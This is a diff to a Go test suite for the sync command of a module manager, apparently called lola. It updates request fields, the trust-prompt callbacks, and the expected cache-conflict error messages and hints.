@@ -984,7 +1750,7 @@ var _ = Describe("Sync", func() {
 			gitIn(work, "reset", "-q", "--hard", pinnedCommit)
 			gitIn(work, "push", "-q", "-f", "--all", bare)
 			before = state()
-			res, err = sync(engine.SyncRequest{Update: []string{"example"}, Options: engine.Options{DryRun: true}})
+			res, err = sync(engine.SyncRequest{Modules: []string{"example"}, Update: true, Options: engine.Options{DryRun: true}})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.Pins).To(BeEmpty(), "the fetch matched the pin")
 			after, _, err := e.Store.Head("example", "main")
@@ -1002,7 +1768,7 @@ var _ = Describe("Sync", func() {
 			userYML, err := os.ReadFile(p.UserManifest)
 			Expect(err).NotTo(HaveOccurred())
 
-			res, err := sync(engine.SyncRequest{Scope: user, UpdateAll: true, Options: engine.Options{DryRun: true}})
+			res, err := sync(engine.SyncRequest{Scope: user, Update: true, Options: engine.Options{DryRun: true}})
 			Expect(err).NotTo(HaveOccurred())
 			Expect(res.Pins).To(HaveExactElements(And(HaveField("Commit", commit), HaveField("Written", false),
 				HaveField("PreviousDigest", pinned.Find("example").Digest))))
@@ -1022,7 +1788,7 @@ var _ = Describe("Sync", func() {
 			kit := filepath.Join(proj, "mods", "kit")
 			writeTree(kit, map[string]string{"lola.yml": "name: kit\n", "commands/fix.md": "Fix.\n"})
 			pull(manifest.Change{Set: []manifest.Entry{{Name: "kit", Source: "mods/kit"}}})
-			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (bool, error) { return false, nil }})
+			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) { return engine.TrustAnswer{}, nil }})
 			Expect(err).To(MatchError(engine.ErrDeclined))
 			Expect(cacheNames()).To(Equal([]string{"example"}), "the covered entry at its pin is cached, the pulled one is not")
 			Expect(staged()).To(BeEmpty())
@@ -1042,13 +1808,13 @@ var _ = Describe("Sync", func() {
 				return out
 			}
 			before := project()
-			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (bool, error) {
+			_, err := sync(engine.SyncRequest{Trust: func(engine.TrustReport) (engine.TrustAnswer, error) {
 				// Another lola caches the name from another source while this one asks.
 				spec, ok, err := source.Parse(elsewhere, "/")
 				Expect(err).NotTo(HaveOccurred())
 				Expect(ok).To(BeTrue())
 				_, err = e.Fetch(ctx, spec)
-				return true, err
+				return engine.TrustAnswer{All: true}, err
 			}})
 			Expect(err).To(MatchError(ContainSubstring(`a different module named "kit" is already in your cache`)))
 			Expect(project()).To(Equal(before))
@@ -1093,7 +1859,6 @@ var _ = Describe("Sync", func() {
 			_, err := e.Install(ctx, sc, proj, []engine.InstallRequest{{Arg: kit}}, engine.Options{Targets: claude.Targets, AllowHooks: true})
 			Expect(err).NotTo(HaveOccurred())
 			pull(manifest.Change{Set: []manifest.Entry{{Name: "example", Source: url, Ref: "v1"}}}) // a pin to write
-			Expect(e.Trust.Save(proj, trust.ViewOf(loadManifest()))).To(Succeed())
 			writeTree(kit, map[string]string{"commands/fix.md": "Fix v2.\n", "hooks/pre.sh": "#!/bin/sh\nexit 3\n"})
 			before := state()
 			_, err = sync(engine.SyncRequest{Trust: yes, Options: allow})
@@ -1172,7 +1937,7 @@ var _ = Describe("Sync", func() {
 				_, err := sync(engine.SyncRequest{Options: engine.Options{DryRun: dry}})
 				Expect(err).To(MatchError("example in your cache comes from " + url + ", and project.yml asks for " + folder +
 					"; the cache is shared by every project on this machine"))
-				Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example", "then run lola sync again"}))
+				Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)", "then: lola sync"}))
 			}
 			Expect(requests.Load()).To(BeZero())
 			Expect(state()).To(Equal(before))
@@ -1194,7 +1959,7 @@ var _ = Describe("Sync", func() {
 			_, err = sync(engine.SyncRequest{})
 			Expect(err).To(MatchError("example in your cache comes from " + a + ", and project.yml asks for " + b +
 				"; the cache is shared by every project on this machine"))
-			Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example", "then run lola sync again"}))
+			Expect(errs.Hints(err)).To(Equal([]string{"remove it from your cache: lola cache rm example (add -y off a terminal)", "then: lola sync"}))
 			Expect(state()).To(Equal(before))
 		})
 
@@ -1228,8 +1993,8 @@ var _ = Describe("Sync", func() {
 			_, err = sync(engine.SyncRequest{})
 			Expect(err).To(MatchError("other: project.yml gives it no targets"))
 			Expect(os.WriteFile(manPath, good, 0o600)).To(Succeed())
-			_, err = sync(engine.SyncRequest{Update: []string{"nope"}})
-			Expect(err).To(MatchError("nope is not in project.yml"))
+			_, err = sync(engine.SyncRequest{Modules: []string{"nope"}, Update: true})
+			Expect(err).To(MatchError("nope is neither in project.yml nor installed here"))
 			Expect(errs.Hints(err)).To(Equal([]string{"modules in project.yml: other"}))
 		})
 	})
